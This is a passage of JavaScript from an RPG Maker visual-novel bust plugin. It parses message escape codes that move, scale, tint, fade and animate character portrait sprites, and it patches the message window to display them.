  text = text.replace(/\x1bBUSTSLIDEOUTTORIGHT\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustSlideDuration : parseInt(t[1]) || 0;
    e.slideOutToRight(a);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTSCALETO\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseFloat(t[1]) || 0;
    var s = t[2] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseInt(t[2]) || 0;
    e.scaleTo(a, s);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTSCALEBY\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseFloat(t[1]) || 0;
    var s = t[2] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseInt(t[2]) || 0;
    e.scaleBy(a, s);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTSCALETOX\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseFloat(t[1]) || 0;
    var s = t[2] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseInt(t[2]) || 0;
    e.scaleToX(a, s);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTSCALEBYX\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseFloat(t[1]) || 0;
    var s = t[2] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseInt(t[2]) || 0;
    e.scaleByX(a, s);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTSCALETOY\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseFloat(t[1]) || 0;
    var s = t[2] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseInt(t[2]) || 0;
    e.scaleToY(a, s);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTSCALEBYY\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseFloat(t[1]) || 0;
    var s = t[2] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseInt(t[2]) || 0;
    e.scaleByY(a, s);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTTONE\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = parseInt(t[1]) || 0;
    var s = parseInt(t[2]) || 0;
    var r = parseInt(t[3]) || 0;
    var i = parseInt(t[4]) || 0;
    var n = t[5] === undefined ? Imported.Irina_VisualNovelBusts.BustToneDuration : parseInt(t[5]) || 0;
    e.setTone(a, s, r, i, n);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTDIM\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustToneDuration : parseInt(t[1]) || 0;
    e.dim(a);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTLIGHT\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustToneDuration : parseInt(t[1]) || 0;
    e.light(a);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUST(?:INDEX|EXP|EXPRESSION)\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1].toUpperCase().trim();
    e.setExpression(a);
    return "";
  }.bind(this));
  return text;
};
Imported.Irina_VisualNovelBusts.Window_Base_processEscapeCharacter = Window_Base.prototype.processEscapeCharacter;
Window_Base.prototype.processEscapeCharacter = function (code, textState) {
  if (code.match(/BUSTMSG(?:ANI|ANIMATION)/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var animation = $dataAnimations[this.getBattleAnimationForBustCode(array[1])];
    var mirror = !!eval(array[2]);
    var delay = parseInt(array[3]) || 0;
    sprite.clearRepeatingAnimation();
    sprite.startAnimation(animation, mirror, delay);
  } else if (code.match(/BUSTMSG(?:REP|REPEAT|REPEATING)(?:ANI|ANIMATION)/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var animation = this.getBattleAnimationForBustCode(array[1]);
    var mirror = !!eval(array[2]);
    var delay = parseInt(array[3]) || 0;
    sprite.setupRepeatingAnimation(animation, mirror, delay);
  } else if (code.match(/BUSTMSG(?:STOP|CLEAR)(?:ANI|ANIMATION)/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    sprite.clearRepeatingAnimation();
  } else if (code.match(/BUSTMSGMOVETO/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var x = parseInt(array[1]) || 0;
    var y = parseInt(array[2]) || 0;
    var duration = array[3] === undefined ? Imported.Irina_VisualNovelBusts.BustMoveDuration : parseInt(array[3]) || 0;
    sprite.moveTo(x, y, duration);
  } else if (code.match(/BUSTMSGMOVEBY/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var x = parseInt(array[1]) || 0;
    var y = parseInt(array[2]) || 0;
    var duration = array[3] === undefined ? Imported.Irina_VisualNovelBusts.BustMoveDuration : parseInt(array[3]) || 0;
    sprite.moveBy(x, y, duration);
  } else if (code.match(/BUSTMSGMOVETYPE/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var type = String(array[1]);
    sprite.moveType(type);
  } else if (code.match(/BUSTMSGMOVEHOME/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var duration = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustMoveDuration : parseInt(array[1]) || 0;
    sprite.moveHome(duration);
  } else if (code.match(/BUSTMSGFADEIN/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var duration = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustFadeDuration : parseInt(array[1]) || 0;
    sprite.fadeIn(duration);
  } else if (code.match(/BUSTMSGFADEOUT/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var duration = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustFadeDuration : parseInt(array[1]) || 0;
    sprite.fadeOut(duration);
  } else if (code.match(/BUSTMSGOPACITYTO/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var opacity = parseInt(array[1]).clamp(0, 255);
    var duration = array[2] === undefined ? Imported.Irina_VisualNovelBusts.BustOpacityDuration : parseInt(array[1]) || 0;
    sprite.opacityTo(opacity, duration);
  } else if (code.match(/BUSTMSGOPACITYBY/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var opacity = parseInt(array[1]).clamp(0, 255);
    var duration = array[2] === undefined ? Imported.Irina_VisualNovelBusts.BustOpacityDuration : parseInt(array[1]) || 0;
    sprite.opacityBy(opacity, duration);
  } else if (code.match(/BUSTMSGMIRRORTOGGLE/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    sprite.mirrorToggle();
  } else if (code.match(/BUSTMSGMIRROR/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    sprite.mirror();
  } else if (code.match(/BUSTMSGUNMIRROR/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    sprite.unmirror();
  } else if (code.match(/BUSTMSGSLIDEINFROMLEFT/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var duration = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustSlideDuration : parseInt(array[1]) || 0;
    sprite.slideInFromLeft(duration);
  } else if (code.match(/BUSTMSGSLIDEINFROMRIGHT/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var duration = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustSlideDuration : parseInt(array[1]) || 0;
    sprite.slideInFromRight(duration);
  } else if (code.match(/BUSTMSGSLIDEIN/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var duration = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustSlideDuration : parseInt(array[1]) || 0;
    sprite.slideIn(duration);
  } else if (code.match(/BUSTMSGSLIDEOUTTOLEFT/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var duration = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustSlideDuration : parseInt(array[1]) || 0;
    sprite.slideOutToLeft(duration);
  } else if (code.match(/BUSTMSGSLIDEOUTTORIGHT/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var duration = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustSlideDuration : parseInt(array[1]) || 0;
    sprite.slideOutToRight(duration);
  } else if (code.match(/BUSTMSGSLIDEOUT/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var duration = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustSlideDuration : parseInt(array[1]) || 0;
    sprite.slideOut(duration);
  } else if (code.match(/BUSTMSGSCALETOX/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var scale = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseFloat(array[1]) || 0;
    var duration = array[2] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseInt(array[2]) || 0;
    sprite.scaleToX(scale, duration);
  } else if (code.match(/BUSTMSGSCALEBYX/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var scale = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseFloat(array[1]) || 0;
    var duration = array[2] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseInt(array[2]) || 0;
    sprite.scaleByX(scale, duration);
  } else if (code.match(/BUSTMSGSCALETOY/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var scale = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseFloat(array[1]) || 0;
    var duration = array[2] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseInt(array[2]) || 0;
    sprite.scaleToY(scale, duration);
  } else if (code.match(/BUSTMSGSCALEBYY/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var scale = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseFloat(array[1]) || 0;
    var duration = array[2] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseInt(array[2]) || 0;
    sprite.scaleByY(scale, duration);
  } else if (code.match(/BUSTMSGSCALETO/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var scale = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseFloat(array[1]) || 0;
    var duration = array[2] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseInt(array[2]) || 0;
    sprite.scaleTo(scale, duration);
  } else if (code.match(/BUSTMSGSCALEBY/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var scale = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseFloat(array[1]) || 0;
    var duration = array[2] === undefined ? Imported.Irina_VisualNovelBusts.BustScaleDuration : parseInt(array[2]) || 0;
    sprite.scaleBy(scale, duration);
  } else if (code.match(/BUSTMSGTONE/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var r = parseInt(array[1]) || 0;
    var g = parseInt(array[2]) || 0;
    var b = parseInt(array[3]) || 0;
    var s = parseInt(array[4]) || 0;
    var duration = array[5] === undefined ? Imported.Irina_VisualNovelBusts.BustToneDuration : parseInt(array[5]) || 0;
    sprite.setTone(r, g, b, s, duration);
  } else if (code.match(/BUSTMSGDIM/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var duration = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustToneDuration : parseInt(array[1]) || 0;
    sprite.dim(duration);
  } else if (code.match(/BUSTMSGLIGHT/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var duration = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustToneDuration : parseInt(array[1]) || 0;
    sprite.light(duration);
  } else if (code.match(/BUSTMSG(?:INDEX|EXP|EXPRESSION)/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var expression = array[1].toUpperCase().trim();
    sprite.setExpression(expression);
  } else if (code.match(/BUSTMSGCLEAR/i)) {
    var array = this.obtainVNBustMsgEscapeString(textState).split(",");
    var sprite = $bust(parseInt(array[0]));
    var duration = array[1] === undefined ? Imported.Irina_VisualNovelBusts.BustClearDuration : parseInt(array[1]) || 0;
    sprite.clear(duration);
  } else {
    Imported.Irina_VisualNovelBusts.Window_Base_processEscapeCharacter.call(this, code, textState);
  }
};
Window_Base.prototype.obtainVNBustMsgEscapeString = function (t) {
  var e = /^\[(.*?)\]/.exec(t.text.slice(t.index));
  if (e) {
    t.index += e[0].length;
    return String(e[0].slice(1, e[0].length - 1));
  } else {
    return "";
  }
};
Imported.Irina_VisualNovelBusts.Window_Message_initMembers = Window_Message.prototype.initMembers;
Window_Message.prototype.initMembers = function () {
  Imported.Irina_VisualNovelBusts.Window_Message_initMembers.call(this);
  this.createMessageBustSprites();
};
Window_Message.prototype.createMessageBustSprites = function () {
  this._messageBodyBustSprite = new Sprite_VisualNovelBust(0);
  this.addChildToBack(this._messageBodyBustSprite);
};
Window_Message.prototype.isUsingFaceBust = function () {
  if ($gameMessage.faceName().match(/\[BUST\]/i)) {
    return true;
  }
  if ($gameMessage.allText().match(/\\BUST\[(\d+)\]/i) || $gameMessage.allText().match(/\x1bBUST\[(\d+)\]/i)) {
    return true;
  }
  return false;
};
Imported.Irina_VisualNovelBusts.Window_Message_loadMessageFace = Window_Message.prototype.loadMessageFace;
Window_Message.prototype.loadMessageFace = function () {
  if (this.isUsingFaceBust()) {
    this._faceBitmap = ImageManager.reserveFace("", 0, this._imageReservationId);
  } else {
    Imported.Irina_VisualNovelBusts.Window_Message_loadMessageFace.call(this);
  }
};
Imported.Irina_VisualNovelBusts.Window_Message_drawMessageFace = Window_Message.prototype.drawMessageFace;
Window_Message.prototype.drawMessageFace = function () {
  if (!this.isUsingFaceBust()) {
    Imported.Irina_VisualNovelBusts.Window_Message_drawMessageFace.call(this);
  }
};
Window_Message.prototype.refreshMessageBustSprite = function () {
  if (!this.isUsingFaceBust()) {
    return;
  }
  var t = $gameMessage.allText();
  if (t.match(/\\BUST\[(\d+)\]/i) || t.match(/\x1bBUST\[(\d+)\]/i)) {
    var e = parseInt(RegExp.$1).clamp(0, 10);
    if (e > 0) {
      var a = $bust(e);
      if (a) {
        a.loadBitmap("face", $gameMessage.faceName());
      }
    } else {
      this.makeMessageWindowBust($gameMessage.faceName());
    }
  } else {
    this.makeMessageWindowBust($gameMessage.faceName());
  }
};
Window_Message.prototype.makeMessageWindowBust = function (t) {
  this._messageBodyBustSprite.x = Imported.Irina_VisualNovelBusts.BustDefaults[0].ScreenX.call(this);
  this._messageBodyBustSprite.y = Imported.Irina_VisualNovelBusts.BustDefaults[0].ScreenY.call(this);
  this._messageBodyBustSprite.loadBitmap("face", t);
};
Imported.Irina_VisualNovelBusts.Window_Message_newLineX = Window_Message.prototype.newLineX;
Window_Message.prototype.newLineX = function () {
  var t = $gameMessage.allText();
  if (t.match(/\\BUST\[(\d+)\]/i) || t.match(/\x1bBUST\[(\d+)\]/i)) {
    var e = parseInt(RegExp.$1);
    if (e > 0) {
      return 0;
    } else {
      return Imported.Irina_VisualNovelBusts.Window_Message_newLineX.call(this);
    }
  } else {
    return Imported.Irina_VisualNovelBusts.Window_Message_newLineX.call(this);
  }
};
Window_Message.prototype.close = function () {
  Window_Base.prototype.close.call(this);
  setTimeout(this.closeMessageBodyBustSprite.bind(this), 50);
};
Window_Message.prototype.closeMessageBodyBustSprite = function () {
  if (this._messageBodyBustSprite && (this.isClosing() || this.isClosed())) {
    this._messageBodyBustSprite.clear();
  }
};
Imported.Irina_VisualNovelBusts.Window_Message_isTriggered = Window_Message.prototype.isTriggered;
Window_Message.prototype.isTriggered = function () {
  var t = Imported.Irina_VisualNovelBusts.Window_Message_isTriggered.call(this);
  if (t && this.isAnyBustPlayingAnAction()) {
    return false;
  }
  return t;
};
Window_Message.prototype.isAnyBustPlayingAnAction = function () {
  for (var t = 0; t <= 10; t++) {
    if ($bust(t) && $bust(t).isActionPlaying()) {
      return true;
    }
  }
  return false;
};